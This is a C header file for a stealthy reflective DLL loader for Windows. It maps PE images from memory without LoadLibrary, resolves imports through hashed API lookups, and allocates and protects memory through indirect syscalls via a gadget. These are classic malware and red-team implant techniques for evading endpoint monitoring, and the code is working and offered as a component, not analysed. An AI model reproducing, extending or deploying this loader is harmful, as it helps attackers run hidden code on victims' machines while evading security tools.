// =============================================================================
// manual_mapper.h – Manual PE Mapping (Reflective Loader)
// =============================================================================
// Features:
//   - Zero-dependency PE loading (no LoadLibrary / LdrLoadDll)
//   - Manual section mapping and protection finalization
//   - Base relocation handling (DIR64)
//   - Stealthy import resolution via triple-hash walk
//   - Syscall-based memory allocation (NtAllocateVirtualMemory)
// =============================================================================

#ifndef MANUAL_MAPPER_H
#define MANUAL_MAPPER_H

#include <windows.h>
#include <winternl.h>
#include "api_hashes.h"
#include "syscalls.h"

extern PVOID     g_SyscallGadget;
extern API_TABLE g_ApiTable;

// =============================================================================
// MANUAL MAPPER CORE
// =============================================================================

// Estructura extendida para TLS y excepciones
typedef struct _MANUAL_MAP_CONTEXT_EXTENDED {
    PVOID BaseAddress;
    PIMAGE_NT_HEADERS NtHeaders;
    PIMAGE_SECTION_HEADER TextSection;
    SIZE_T RegionSize;
    // TLS Callbacks
    PIMAGE_TLS_DIRECTORY TlsDir;
    BOOLEAN TlsCallbacksExecuted;
    // Exception Directory
    PIMAGE_RUNTIME_FUNCTION_ENTRY ExceptionDir;
    DWORD ExceptionDirCount;
} MANUAL_MAP_CONTEXT_EXTENDED, *PMANUAL_MAP_CONTEXT_EXTENDED;

static PVOID ManualMapExtended(PVOID pRawDll, SIZE_T dllSize, BOOL execEntry, PMANUAL_MAP_CONTEXT_EXTENDED ctxOut) {
    PIMAGE_DOS_HEADER pDos = (PIMAGE_DOS_HEADER)pRawDll;
    if (pDos->e_magic != IMAGE_DOS_SIGNATURE) return NULL;

    PIMAGE_NT_HEADERS pNt = (PIMAGE_NT_HEADERS)((PBYTE)pRawDll + pDos->e_lfanew);
    if (pNt->Signature != IMAGE_NT_SIGNATURE) return NULL;

    // 1. Allocate Image Base via Syscall
    PVOID pImageBase = (PVOID)pNt->OptionalHeader.ImageBase;
    SIZE_T imageSize = pNt->OptionalHeader.SizeOfImage;
    
    NTSTATUS status = InvokeSyscall(g_ApiTable.syscalls.NtAllocateVirtualMemory.ssn,
        g_SyscallGadget, (HANDLE)-1, &pImageBase, 0, &imageSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    
    if (status != 0) {
        pImageBase = NULL;
        status = InvokeSyscall(g_ApiTable.syscalls.NtAllocateVirtualMemory.ssn,
            g_SyscallGadget, (HANDLE)-1, &pImageBase, 0, &imageSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
        if (status != 0) return NULL;
    }

    // 2. Copy Headers
    memcpy(pImageBase, pRawDll, pNt->OptionalHeader.SizeOfHeaders);

    // 3. Copy Sections
    PIMAGE_SECTION_HEADER pSec = IMAGE_FIRST_SECTION(pNt);
    for (WORD i = 0; i < pNt->FileHeader.NumberOfSections; i++) {
        if (pSec[i].SizeOfRawData) {
            memcpy((PBYTE)pImageBase + pSec[i].VirtualAddress,
                   (PBYTE)pRawDll + pSec[i].PointerToRawData,
                   pSec[i].SizeOfRawData);
        }
    }

    // 4. Handle Relocations
    if ((ULONG_PTR)pImageBase != pNt->OptionalHeader.ImageBase) {
        ULONG_PTR delta = (ULONG_PTR)pImageBase - pNt->OptionalHeader.ImageBase;
        PIMAGE_DATA_DIRECTORY relocDir = &pNt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC];
        if (relocDir->Size > 0) {
            PIMAGE_BASE_RELOCATION pReloc = (PIMAGE_BASE_RELOCATION)((PBYTE)pImageBase + relocDir->VirtualAddress);
            while (pReloc->VirtualAddress) {
                DWORD count = (pReloc->SizeOfBlock - sizeof(IMAGE_BASE_RELOCATION)) / sizeof(WORD);
                PWORD pEntry = (PWORD)((PBYTE)pReloc + sizeof(IMAGE_BASE_RELOCATION));
                for (DWORD j = 0; j < count; j++) {
                    if ((pEntry[j] >> 12) == IMAGE_REL_BASED_DIR64) {
                        ULONG_PTR* patchAddr = (ULONG_PTR*)((PBYTE)pImageBase + pReloc->VirtualAddress + (pEntry[j] & 0xFFF));
                        *patchAddr += delta;
                    }
                }
                pReloc = (PIMAGE_BASE_RELOCATION)((PBYTE)pReloc + pReloc->SizeOfBlock);
            }
        }
    }

    // 5. Resolve Imports
    PIMAGE_DATA_DIRECTORY importDir = &pNt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT];
    if (importDir->Size > 0) {
        PIMAGE_IMPORT_DESCRIPTOR pImport = (PIMAGE_IMPORT_DESCRIPTOR)((PBYTE)pImageBase + importDir->VirtualAddress);
        while (pImport->Name) {
            const char* moduleName = (const char*)((PBYTE)pImageBase + pImport->Name);
            PVOID hMod = GetModuleBaseByHash(GenerateTripleHashA(moduleName, TRUE));
            if (hMod) {
                PIMAGE_THUNK_DATA pThunk = (PIMAGE_THUNK_DATA)((PBYTE)pImageBase + pImport->FirstThunk);
                PIMAGE_THUNK_DATA pOrig = (pImport->OriginalFirstThunk) ? (PIMAGE_THUNK_DATA)((PBYTE)pImageBase + pImport->OriginalFirstThunk) : pThunk;
                while (pOrig->u1.AddressOfData) {
                    if (IMAGE_SNAP_BY_ORDINAL(pOrig->u1.Ordinal)) {
                        // Ordinal resolution logic could go here
                    } else {
                        PIMAGE_IMPORT_BY_NAME pName = (PIMAGE_IMPORT_BY_NAME)((PBYTE)pImageBase + pOrig->u1.AddressOfData);
                        pThunk->u1.Function = (ULONG_PTR)ResolveApiByHash(hMod, GenerateTripleHashA((const char*)pName->Name, FALSE));
                    }
                    pThunk++; pOrig++;
                }
            }
            pImport++;
        }
    }

    // 6. TLS and Exception Directories
    DWORD tlsRva = pNt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_TLS].VirtualAddress;
    if (tlsRva && ctxOut) {
        ctxOut->TlsDir = (PIMAGE_TLS_DIRECTORY)((PBYTE)pImageBase + tlsRva);
    }

    DWORD excepRva = pNt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXCEPTION].VirtualAddress;
    DWORD excepSize = pNt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXCEPTION].Size;
    if (excepRva && excepSize && ctxOut) {
        ctxOut->ExceptionDir = (PIMAGE_RUNTIME_FUNCTION_ENTRY)((PBYTE)pImageBase + excepRva);
        ctxOut->ExceptionDirCount = excepSize / sizeof(IMAGE_RUNTIME_FUNCTION_ENTRY);
    }

    // 7. Finalize Section Protections
    for (WORD i = 0; i < pNt->FileHeader.NumberOfSections; i++) {
        PVOID pAddr = (PBYTE)pImageBase + pSec[i].VirtualAddress;
        SIZE_T sSize = pSec[i].Misc.VirtualSize;
        ULONG prot = (pSec[i].Characteristics & IMAGE_SCN_MEM_EXECUTE) ? ((pSec[i].Characteristics & IMAGE_SCN_MEM_WRITE) ? PAGE_EXECUTE_READWRITE : PAGE_EXECUTE_READ) : ((pSec[i].Characteristics & IMAGE_SCN_MEM_WRITE) ? PAGE_READWRITE : PAGE_READONLY);
        ULONG oldProt = 0;
        InvokeSyscall(g_ApiTable.syscalls.NtProtectVirtualMemory.ssn, g_SyscallGadget, (HANDLE)-1, &pAddr, &sSize, prot, &oldProt);
    }

    // 8. Execute TLS callbacks
    if (ctxOut && ctxOut->TlsDir && ctxOut->TlsDir->AddressOfCallBacks) {
        PIMAGE_TLS_CALLBACK* callbacks = (PIMAGE_TLS_CALLBACK*)(ctxOut->TlsDir->AddressOfCallBacks);
        for (int i = 0; callbacks[i]; i++) {
            callbacks[i](pImageBase, DLL_PROCESS_ATTACH, NULL);
        }
        ctxOut->TlsCallbacksExecuted = TRUE;
    }

    // 9. Call DllMain
    if (execEntry && pNt->OptionalHeader.AddressOfEntryPoint) {
        typedef BOOL (WINAPI* DllMain_t)(HINSTANCE, DWORD, LPVOID);
        DllMain_t dllMain = (DllMain_t)((PBYTE)pImageBase + pNt->OptionalHeader.AddressOfEntryPoint);
        dllMain((HINSTANCE)pImageBase, DLL_PROCESS_ATTACH, NULL);
    }

    if (ctxOut) {
        ctxOut->BaseAddress = pImageBase;
        ctxOut->NtHeaders = pNt;
        ctxOut->RegionSize = imageSize;
    }

    return pImageBase;
}

// Legacy wrapper
static PVOID ManualMap(PVOID pRawDll, SIZE_T dllSize, BOOL execEntry) {
    MANUAL_MAP_CONTEXT_EXTENDED ctx = {0};
    return ManualMapExtended(pRawDll, dllSize, execEntry, &ctx);
}

#endif
